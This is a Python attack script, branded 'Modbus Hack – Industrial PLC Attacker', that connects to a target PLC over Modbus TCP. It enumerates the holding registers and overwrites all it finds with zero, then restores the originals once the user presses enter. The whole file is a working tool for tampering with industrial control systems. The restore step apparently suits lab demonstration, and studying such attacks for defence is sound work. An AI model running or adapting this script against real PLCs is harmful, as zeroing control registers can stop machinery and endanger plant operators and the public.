#!/usr/bin/env python
from pymodbus.client import ModbusTcpClient
import time

class color:
   PURPLE = "\033[95m"
   CYAN = "\033[96m"
   DARKCYAN = "\033[36m"
   BLUE = "\033[94m"
   GREEN = "\033[92m"
   YELLOW = "\033[93m"
   RED = "\033[91m"
   BOLD = "\033[1m"
   UNDERLINE = "\033[4m"
   END = "\033[0m"

print("\n")
print(color.PURPLE +  "   ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗ " + color.END)
print(color.CYAN +    "   ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝ " + color.END)
print(color.DARKCYAN +"   ██╔████╔██║██║   ██║██║  ██║██████╔╝██║   ██║███████╗    ███████║███████║██║     █████╔╝  " + color.END)
print(color.BLUE +    "   ██║╚██╔╝██║██║   ██║██║  ██║██╔══██╗██║   ██║╚════██║    ██╔══██║██╔══██║██║     ██╔═██╗  " + color.END)
print(color.GREEN +   "   ██║ ╚═╝ ██║╚██████╔╝██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║  ██║╚██████╗██║  ██╗ " + color.END)
print(color.YELLOW +  "   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ " + color.END)
print(color.YELLOW +  "\n                                     Industrial PLC Attacker                     "  + color.END)

PLC_address =  input(color.BOLD + "\n\nTarget PLC IP address? " + color.END + "[10.45.0.2]  ") or "10.45.0.2"
Last_Hregister = int(input(color.BOLD + "How many registeres? " + color.END + "[300]  ") or "300")

print("\n\n---- Start seraching register addresses ----\n")
client = ModbusTcpClient(PLC_address)

hreg_address = list()
hreg_value = list()
valid_address = list()

client.connect()

time.sleep(2)

for i in range(Last_Hregister):
        Hregisters = client.read_holding_registers(i+1, 1)
        hreg_address.append(i+1)
        hreg_value.append(Hregisters)
        print(str(i+1) + " = " + str(Hregisters))

print("\n---- Register Search Completed ----\n")

for i in range(len(hreg_address)):
        try:
                print("Holding Register Detected.  " +color.BOLD + color.GREEN + str(hreg_address[i]) + " " + str(hreg_value[i].registers) + color.END)
                valid_address.append(i+1)
        except:
                continue

attack = input(color.BOLD + color.RED + "\n\nDo you want to overwrite these registers with zero? [Y/n]  " + color.END) or "Y"
print("")
print("")
print(color.RED + "!!!!!!! Force rewrite these registers Zero !!!!!!!!" + color.END)

time.sleep(5)

if attack == "Y" or attack == "y":
        for i in range(len(valid_address)):
                client.write_registers(valid_address[i], 0)

        print("")
        print("")
        print(color.RED + "                █████████               " + color.END)
        print(color.RED + "              █████████████             " + color.END)
        print(color.RED + "             ███████████████            " + color.END)
        print(color.RED + "           ██████████████████           " + color.END)
        print(color.RED + "           ███████████████████          " + color.END)
        print(color.RED + "          ████████████████████          " + color.END)
        print(color.RED + "    █     █████████████████████    █    " + color.END)
        print(color.RED + "   ████   █████████████████████  ████   " + color.END)
        print(color.RED + "   █████  █████████████████████  ████   " + color.END)
        print(color.RED + "  ██████  █████████████████████ ██████  " + color.END)
        print(color.RED + " ████████ ██ ███████████████ ██ ███████ " + color.END)
        print(color.RED + " ████████ █ ████████████████ ██ ███████ " + color.END)
        print(color.RED + "  ███████ █ ████████████████ █ ███████  " + color.END)
        print(color.RED + "   ██████ █ █    ██████    ██  ███████  " + color.END)
        print(color.RED + "        █ ██      ████      ████        " + color.END)
        print(color.RED + "           █       ███      ██          " + color.END)
        print(color.RED + "          ██      ████      ██          " + color.END)
        print(color.RED + "          ██      █████     ███         " + color.END)
        print(color.RED + "          ███   ███   ██    ██          " + color.END)
        print(color.RED + "          ████████  █ ████████          " + color.END)
        print(color.RED + "           ███████  █ ███████           " + color.END)
        print(color.RED + "               ███  █ ███               " + color.END)
        print(color.RED + "            ██  █████████ ██            " + color.END)
        print(color.RED + "          ██ █  █████████ ██ █          " + color.END)
        print(color.RED + "      ██████ ██   █████   ██ ██████     " + color.END)
        print(color.RED + "  ██████████ ███ ██   ████████████████  " + color.END)
        print(color.RED + "  ██████████ ███   ██   ███  ██████████ " + color.END)
        print(color.RED + "  ████████    ███ █ █ █████   ████████  " + color.END)
        print(color.RED + "   ██████     █████  █████     ██████   " + color.END)
        print(color.RED + "   █████       ███████████      █████   " + color.END)
        print(color.RED + "    ███         █████████        ████   " + color.END)
        print(color.RED + "                 ██████                 " + color.END)
        print("")
        print("")
        print("")
        input(color.CYAN + "\n\n!!!!! DONE. Hit enter to quit !!!!" + color.END)

        for i in range(len(valid_address)):
                client.write_registers(valid_address[i], hreg_value[valid_address[i]-1].registers)


client.close()